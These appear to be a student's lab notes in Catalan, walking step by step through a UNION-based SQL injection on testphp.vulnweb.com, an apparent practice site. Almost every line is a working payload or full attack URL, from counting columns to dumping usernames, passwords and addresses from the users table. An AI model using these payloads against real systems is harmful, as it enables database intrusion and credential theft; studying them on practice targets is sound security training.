-- #1: Trobar una llista on poder visualitzar informació de la BD
http://testphp.vulnweb.com/listproducts.php?cat=1

-- #2: Detectar quantes columnes té la taula que consultem
ORDER BY 15
http://testphp.vulnweb.com/listproducts.php?cat=1 ORDER BY 15
http://testphp.vulnweb.com/listproducts.php?cat=1 ORDER BY 11

-- #3: Detetar quins camps hem d'editar per extraure informació
UNION SELECT 1,2,3,4,5,6,7,8,9,10,11
http://testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11
-- hem d'editar els camps 7, 2, 9

-- #4 Veure l'usuari actual, la base de dades actual i la versió del SGBD
USER(), DATABASE(), VERSION()
UNION SELECT 1,DATABASE(),3,4,5,6,USER(),8,VERSION(),10,11
http://testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 1,DATABASE(),3,4,5,6,USER(),8,VERSION(),10,11

-- #5 Investigar a quina base de dades podem trobar informació sobre els usuaris registrats
UNION SELECT 1,2,3,4,5,6,schema_name,8,9,10,11 FROM information_schema.schemata
http://testphp.vulnweb.com/listproducts.php?cat=2 UNION SELECT 1,2,3,4,5,6,schema_name,8,9,10,11 FROM information_schema.schemata
-- hi ha 2 bases de dades: 'information_schema' i 'acuart'

-- #6 Investigar a quina taula podem trobar informació sobre els usuaris registrats
UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema = 'acuart'
http://testphp.vulnweb.com/listproducts.php?cat=2 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema = 'acuart'

-- #7 Investigar a quines columnes podem trobar la informació que desitgem
UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_schema = 'acuart' AND table_name = 'users'
http://testphp.vulnweb.com/listproducts.php?cat=2 UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.columns WHERE table_schema = 'acuart' AND table_name = 'users'

-- #8 Consultar la informació sensible dels usuaris
UNION SELECT 1,CONCAT("password: ",pass),3,4,5,6,CONCAT("user: ",uname),8,CONCAT("adress: ",address),10,11 FROM acuart.users
http://testphp.vulnweb.com/listproducts.php?cat=2 UNION SELECT 1,CONCAT("password: ",pass),3,4,5,6,CONCAT("user: ",uname),8,CONCAT("address: ",address),10,11 FROM acuart.users
